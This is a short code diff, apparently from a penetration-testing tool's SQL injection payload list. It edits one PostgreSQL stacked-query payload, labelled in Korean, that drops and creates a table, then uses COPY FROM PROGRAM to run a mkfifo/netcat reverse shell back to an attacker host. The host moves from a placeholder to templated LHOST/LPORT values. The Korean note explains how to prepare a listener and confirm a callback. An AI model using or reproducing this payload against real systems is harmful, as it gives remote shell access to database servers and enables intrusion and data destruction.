@@ -139,10 +139,11 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
       { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
         payload: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(output text); " +
           "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
-          "nc <ATTACKER_IP> 4444 >/tmp/f';--",
-        note: "<ATTACKER_IP>/4444 및 nc 명령 자체는 리버스 쉘 탭에서 LHOST/LPORT로 직접 생성한 뒤 " +
-          "COPY ... FROM PROGRAM '...' 안에 그대로 넣어 바꿔치기하세요. 결과가 응답에 안 보여도 " +
-          "상관없습니다 -- 리스너에 연결되는지로 성공 여부를 확인하면 됩니다." },
+          "nc {LHOST} {LPORT} >/tmp/f';--",
+        note: "{LHOST}/{LPORT}는 아래 입력값으로 자동 치환됩니다 -- 감지 안 되면 직접 채워 넣으세요. " +
+          "같은 포트로 Enumeration 탭의 리버스 쉘 패널(Ctrl+K에서 \"리버스쉘\" 검색)에서 리스너를 " +
+          "준비한 뒤 이 페이로드를 보내세요. 결과가 응답에 안 보여도 상관없습니다 -- 리스너에 " +
+          "연결되는지로 성공 여부를 확인하면 됩니다." },
     ],
   },
   {
